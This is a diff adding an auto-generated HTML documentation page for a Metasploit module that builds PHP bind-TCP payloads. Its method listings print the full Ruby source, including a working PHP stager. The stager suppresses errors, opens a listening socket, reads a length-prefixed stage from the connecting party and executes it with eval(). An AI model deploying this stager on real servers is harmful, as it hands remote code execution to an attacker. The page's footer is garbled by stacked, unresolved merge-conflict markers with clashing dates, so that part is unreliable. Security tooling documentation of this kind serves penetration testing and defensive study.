@@ -1,0 +1,667 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>
+  Module: Msf::Payload::Php::BindTcp
+  
+    &mdash; Documentation by YARD 0.8.7.6
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" charset="utf-8" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" charset="utf-8" />
+
+<script type="text/javascript" charset="utf-8">
+  hasFrames = window.top.frames.main ? true : false;
+  relpath = '../../../';
+  framesUrl = "../../../frames.html#!Msf/Payload/Php/BindTcp.html";
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div id="header">
+      <div id="menu">
+  
+    <a href="../../../_index.html">Index (B)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Php.html" title="Msf::Payload::Php (module)">Php</a></span></span>
+     &raquo; 
+    <span class="title">BindTcp</span>
+  
+
+  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
+</div>
+
+      <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+      Class List
+    </a>
+  
+    <a class="full_list_link" id="method_list_link"
+        href="../../../method_list.html">
+      Method List
+    </a>
+  
+    <a class="full_list_link" id="file_list_link"
+        href="../../../file_list.html">
+      File List
+    </a>
+  
+</div>
+      <div class="clear"></div>
+    </div>
+
+    <iframe id="search_frame"></iframe>
+
+    <div id="content"><h1>Module: Msf::Payload::Php::BindTcp
+  
+  
+  
+</h1>
+
+<dl class="box">
+  
+  
+    
+  
+    
+      <dt class="r1">Includes:</dt>
+      <dd class="r1"><span class='object_link'><a href="../Php.html" title="Msf::Payload::Php (module)">Msf::Payload::Php</a></span>, <span class='object_link'><a href="SendUUID.html" title="Msf::Payload::Php::SendUUID (module)">SendUUID</a></span></dd>
+      
+    
+  
+  
+  
+    <dt class="r2 last">Defined in:</dt>
+    <dd class="r2 last">lib/msf/core/payload/php/bind_tcp.rb</dd>
+  
+</dl>
+<div class="clear"></div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>Complex bind_tcp payload generation for PHP</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">- (Object) <strong>generate</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate the first stage.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_bind_tcp-instance_method" title="#generate_bind_tcp (instance method)">- (Object) <strong>generate_bind_tcp</strong>(opts = {}) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#handle_intermediate_stage-instance_method" title="#handle_intermediate_stage (instance method)">- (Object) <strong>handle_intermediate_stage</strong>(conn, payload) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#include_send_uuid-instance_method" title="#include_send_uuid (instance method)">- (Object) <strong>include_send_uuid</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>By default, we don&#39;t want to send the UUID, but we&#39;ll send for
+certain payloads if requested.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#transport_config-instance_method" title="#transport_config (instance method)">- (Object) <strong>transport_config</strong>(opts = {}) </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#use_ipv6-instance_method" title="#use_ipv6 (instance method)">- (Object) <strong>use_ipv6</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="SendUUID.html" title="Msf::Payload::Php::SendUUID (module)">SendUUID</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="SendUUID.html#php_send_uuid-instance_method" title="Msf::Payload::Php::SendUUID#php_send_uuid (method)">#php_send_uuid</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Php.html" title="Msf::Payload::Php (module)">Msf::Payload::Php</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Php.html#php_preamble-instance_method" title="Msf::Payload::Php#php_preamble (method)">#php_preamble</a></span>, <span class='object_link'><a href="../Php.html#php_system_block-instance_method" title="Msf::Payload::Php#php_system_block (method)">#php_system_block</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="generate-instance_method">
+  
+    - (<tt>Object</tt>) <strong>generate</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate the first stage</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+23
+24
+25
+26
+27
+28
+29
+30
+31</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 23</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span>
+  <span class='id identifier rubyid_conf'>conf</span> <span class='op'>=</span> <span class='lbrace'>{</span>
+    <span class='label'>port:</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_php'>php</span> <span class='op'>=</span> <span class='kw'>super</span> <span class='op'>+</span> <span class='id identifier rubyid_generate_bind_tcp'>generate_bind_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_conf'>conf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_php'>php</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>#.*$</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_compress'>compress</span><span class='lparen'>(</span><span class='id identifier rubyid_php'>php</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_bind_tcp-instance_method">
+  
+    - (<tt>Object</tt>) <strong>generate_bind_tcp</strong>(opts = {}) 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 49</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_bind_tcp'>generate_bind_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ipf'>ipf</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AF_INET</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_ip'>ip</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>0.0.0.0</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_use_ipv6'>use_ipv6</span>
+    <span class='id identifier rubyid_ipf'>ipf</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>6</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_ip'>ip</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>[::]</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_php'>php</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>/*&lt;?php /**/
+error_reporting(0);
+$ip = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ip'>ip</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;;
+$port = </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>;
+
+if (is_callable(&#39;stream_socket_server&#39;)) {
+	$srvsock = stream_socket_server(&quot;tcp://{$ip}:{$port}&quot;);
+	if (!$srvsock) { die(); }
+	$s = stream_socket_accept($srvsock, -1);
+	fclose($srvsock);
+	$s_type = &#39;stream&#39;;
+} elseif (is_callable(&#39;socket_create_listen&#39;)) {
+	$srvsock = socket_create_listen(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ipf'>ipf</span><span class='embexpr_end'>}</span><span class='tstring_content'>, SOCK_STREAM, SOL_TCP);
+	if (!$res) { die(); }
+	$s = socket_accept($srvsock);
+	socket_close($srvsock);
+	$s_type = &#39;socket&#39;;
+} elseif (is_callable(&#39;socket_create&#39;)) {
+	$srvsock = socket_create(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ipf'>ipf</span><span class='embexpr_end'>}</span><span class='tstring_content'>, SOCK_STREAM, SOL_TCP);
+	$res = socket_bind($srvsock, $ip, $port);
+	if (!$res) { die(); }
+	$s = socket_accept($srvsock);
+	socket_close($srvsock);
+	$s_type = &#39;socket&#39;;
+} else {
+	die();
+}
+if (!$s) { die(); }
+</span><span class='tstring_end'>^</span></span>
+
+  <span class='id identifier rubyid_php'>php</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_php_send_uuid'>php_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+
+  <span class='id identifier rubyid_php'>php</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>switch ($s_type) { 
+case &#39;stream&#39;: $len = fread($s, 4); break;
+case &#39;socket&#39;: $len = socket_read($s, 4); break;
+}
+if (!$len) {
+	# We failed on the main socket.  There&#39;s no way to continue, so
+	# bail
+	die();
+}
+$a = unpack(&quot;Nlen&quot;, $len);
+$len = $a[&#39;len&#39;];
+
+$b = &#39;&#39;;
+while (strlen($b) &lt; $len) {
+	switch ($s_type) {
+	case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break;
+	case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break;
+	}
+}
+
+# Set up the socket for the main stage to use.
+$GLOBALS[&#39;msgsock&#39;] = $s;
+$GLOBALS[&#39;msgsock_type&#39;] = $s_type;
+eval($b);
+die();</span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="handle_intermediate_stage-instance_method">
+  
+    - (<tt>Object</tt>) <strong>handle_intermediate_stage</strong>(conn, payload) 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+116
+117
+118</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 116</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_handle_intermediate_stage'>handle_intermediate_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_conn'>conn</span><span class='comma'>,</span> <span class='id identifier rubyid_payload'>payload</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_conn'>conn</span><span class='period'>.</span><span class='id identifier rubyid_put'>put</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='id identifier rubyid_payload'>payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>N</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="include_send_uuid-instance_method">
+  
+    - (<tt>Object</tt>) <strong>include_send_uuid</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>By default, we don&#39;t want to send the UUID, but we&#39;ll send for
+certain payloads if requested.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+37
+38
+39</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 37</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="transport_config-instance_method">
+  
+    - (<tt>Object</tt>) <strong>transport_config</strong>(opts = {}) 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+45
+46
+47</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 45</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_transport_config'>transport_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_transport_config_bind_tcp'>transport_config_bind_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="use_ipv6-instance_method">
+  
+    - (<tt>Object</tt>) <strong>use_ipv6</strong> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+41
+42
+43</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php/bind_tcp.rb', line 41</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_use_ipv6'>use_ipv6</span>
+  <span class='kw'>false</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+    <div id="footer">
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+  Generated on Tue Dec 22 22:31:24 2015 by
+=======
+  Generated on Tue Dec  8 22:31:27 2015 by
+>>>>>>> origin/pod/metasploit-api/_index.html
+=======
+  Generated on Tue Dec  8 22:31:27 2015 by
+>>>>>>> origin/pod/metasploit-framework
+=======
+  Generated on Tue Dec  8 22:31:27 2015 by
+>>>>>>> origin/pod/metasploit-windows.rb
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.7).
+=======
+  Generated on Tue Sep  1 22:32:09 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.5).
+>>>>>>> origin/gh-pages
+<<<<<<< HEAD
+<<<<<<< HEAD
+=======
+  Generated on Tue Dec  8 22:31:27 2015 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.6 (ruby-2.1.7).
+>>>>>>> origin/pod/metasploit-excellent.mp3
+=======
+>>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
+</div>
+
+  </body>
+</html>
